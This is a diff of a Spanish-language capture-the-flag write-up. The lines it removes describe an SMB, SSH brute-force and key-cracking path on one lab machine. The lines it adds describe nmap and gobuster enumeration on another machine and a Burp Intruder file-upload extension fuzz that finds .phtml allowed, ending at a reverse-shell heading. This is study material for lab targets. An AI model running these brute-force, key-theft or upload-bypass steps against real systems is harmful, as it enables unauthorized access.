@@ -11,182 +11,142 @@ Se identificaron servicios HTTP, SSH y Samba. Se encontró un share anónimo con
 **Comando**
 
 ```bash
-nmap -sV --open $IP
+nmap -sV -sC --open $IP -oN scan.txt
 ```
 
-**Comentario:** `-sV` detecta versiones de servicios. 
+**Comentario:** `-sV` detecta versiones de servicios; `-sC` ejecuta scripts por defecto; `--open` muestra solo los puertos abiertos; `-oN` guarda la salida en un archivo normal.
 
 **Resultado**
 ```bash
-# Nmap 7.95 scan initiated Fri Sep 26 19:54:46 2025 as: /usr/lib/nmap/nmap --privileged -sV --open $IP
+# Nmap 7.95 scan initiated Sat Sep 27 16:40:06 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC --open -oN scan.txt $IP
 Nmap scan report for $IP
-Host is up (0.35s latency).
-Not shown: 996 closed tcp ports (reset)
-PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
-139/tcp open  netbios-ssn Samba smbd 4
-445/tcp open  netbios-ssn Samba smbd 4
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Host is up (0.32s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.5
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 19:78:f4:6e:d8:11:72:e7:ba:60:0c:d2:ba:c9:a3:e7 (RSA)
+|   256 e1:6e:3e:95:e0:bd:78:db:e9:aa:74:44:67:f0:a6:8e (ECDSA)
+|_  256 8e:8d:24:7f:0d:77:52:20:40:2b:9e:ec:b3:e9:50:a8 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 4
+445/tcp  open  netbios-ssn Samba smbd 4
+3128/tcp open  http-proxy  Squid http proxy 4.10
+|_http-title: ERROR: The requested URL could not be retrieved
+|_http-server-header: squid/4.10
+3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Vuln University
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: -1s
+|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-time: 
+|   date: 2025-09-27T20:40:34
+|_  start_date: N/A
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Fri Sep 26 19:55:04 2025 -- 1 IP address (1 host up) scanned in 18.58 seconds
+# Nmap done at Sat Sep 27 16:40:48 2025 -- 1 IP address (1 host up) scanned in 42.04 seconds
 ```
 **Resumen**
 
+* 21/tcp open ftp (vsftpd/3.0.5)
 * 22/tcp open  ssh (OpenSSH 8.2p1)
-* 80/tcp open  http (Apache/2.4.41)
 * 139/445/tcp open Samba (smbd)
+* 3128/tcp open http-proxy (Squid/4.10)
+* 3333/tcp open  http (Apache/2.4.41)
 
 ---
 
-## Enumeración de directorios web (ffuf)
+## Enumeración de directorios web (Gobuster)
 
 **Comando**
 
 ```bash
-ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 300 -s -c
+gobuster dir -u http://$IP:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 ```
 
-**Comentario:** `-t 300` define la cantidad de hilos; `-s` silencia headers extra; `-c` activa color en resultado.
+**Comentario:** `-u` url target; `-w` ruta de wordlist.
 
 **Resultado**
 ```bash
-# Priority-ordered case-sensitive list, where entries were found
-#
-# Suite 300, San Francisco, California, 94105, USA.
-# Copyright 2007 James Fisher
-# or send a letter to Creative Commons, 171 Second Street,
-# license, visit http://creativecommons.org/licenses/by-sa/3.0/
-#
-
-# directory-list-2.3-small.txt
-#
-# Attribution-Share Alike 3.0 License. To view a copy of this
-#
-# This work is licensed under the Creative Commons
-# on at least 3 different hosts
-development
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.201.63.160:3333
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 322] [--> http://10.201.11.252:3333/images/]                                                                   
+/css                  (Status: 301) [Size: 319] [--> http://10.201.11.252:3333/css/]                                                                      
+/js                   (Status: 301) [Size: 318] [--> http://10.201.11.252:3333/js/]                                                                       
+/internal             (Status: 301) [Size: 324] [--> http://10.201.11.252:3333/internal/] 
 ```
 **Resultado relevante**
 
-* `/development`
-
+* `/internal`, directorio web para subir archivos.
+  
 ---
 
-## Smb — share anónimo
+## Burp Suite
 
-**Enumeración**
+**Petición POST**
 
+Interceptamos la petición POST al subir un archivo a la web con el proxy de BurpSuite, la enviamos al Intruder y marcamos la extensión.
 ```bash
-smbclient -L //$IP
+POST /internal/index.php HTTP/1.1
+Host: $IP:3333
+Content-Length: 291
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://$IP:3333
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ8PkprBlb27KbdYV
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://$IP:3333/internal/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+------WebKitFormBoundaryJ8PkprBlb27KbdYV
+Content-Disposition: form-data; name="file"; filename="test.§php§"
+Content-Type: application/x-php
+
+test
+
+------WebKitFormBoundaryJ8PkprBlb27KbdYV
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundaryJ8PkprBlb27KbdYV--
 ```
 
-**Resultado**
-```bash
-	Sharename       Type      Comment
-	---------       ----      -------
-	Anonymous       Disk      
-	IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
-Reconnecting with SMB1 for workgroup listing.
-Protocol negotiation to server $IP (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
-Unable to connect with SMB1 -- no workgroup available
-```
-**Resultado relevante**
-* Share accesible: `Anonymous (Disk)`
+**Identificar extensión permitida**
 
-**Conexión y archivo**
-
-```bash
-smbclient //$IP/Anonymous
-smb: \> ls
-smb: \> get staff.txt
-```
+Aplicamos una wordlist de extensiones (phpext.txt) como payload para identificar la correcta:
 <details>
-  <summary><i>staff.txt</i></summary>
-  
-```bash
-  Announcement to staff:
-
-PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
-this is how mistakes happen. (This means you too, Jan!)
-
--Kay
-```
-
+	<summary><i>phpext.txt</i></summary>
+		
+		.php
+		.php3
+		.php4
+		.php5
+		.phtml
+	
 </details>
 
-**Comentario:** Indicio de usuario `jan`. Revisar si el share expone archivos sensibles o rutas del filesystem.
-
----
-
-## Fuerza bruta SSH (usuario: jan)
-
-**Comando**
-
-```bash
-hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 4 ssh://$IP
-```
-
-**Comentario:** `-l` especifica login; `-P` wordlist; `-t 4` tareas paralelas. Usar siempre con autorización.
-
 **Resultado**
-```bash
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+* Extensión permitida: `.phtml` 
+## Reverse Shell
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-27 15:49:48
-[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
-[DATA] attacking ssh://$IP/
-[STATUS] 46.00 tries/min, 46 tries in 00:01h, 14344353 to do in 5197:14h, 4 active
-[STATUS] 52.33 tries/min, 157 tries in 00:03h, 14344242 to do in 4568:14h, 4 active
-[STATUS] 52.29 tries/min, 366 tries in 00:07h, 14344033 to do in 4572:20h, 4 active
-[22][ssh] host: $IP   login: jan   password: REDACTED
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-27 16:04:48
-```
-
----
-
-## Acceso inicial y obtención de clave
-
-**Operaciones realizadas**
-
-```bash
-ssh jan@$IP
-# desde la sesión de jan:
-scp jan@$IP:/home/kay/.ssh/id_rsa ./
-```
-
-**Comentario:** La clave privada `id_rsa` estaba accesible desde la cuenta `jan`.
-
----
-
-## Cracking de passphrase y acceso final
-
-**Conversión y cracking**
-
-```bash
-ssh2john id_rsa > rsa_john.txt
-john rsa_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
-```
-
-**Resultado**
-```bash
-Using default input encoding: UTF-8
-Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
-Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
-Cost 2 (iteration count) is 1 for all loaded hashes
-Will run 2 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-PASSWORD_REDACTED          (id_rsa)     
-1g 0:00:00:00 DONE (2025-09-27 15:42) 10.00g/s 827360p/s 827360c/s 827360C/s behlat..bball40
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed.
-```
-**Uso**
-
-```bash
-ssh -i id_rsa kay@$IP
-# introducir passphrase para la clave
-cat pass.bak
-```
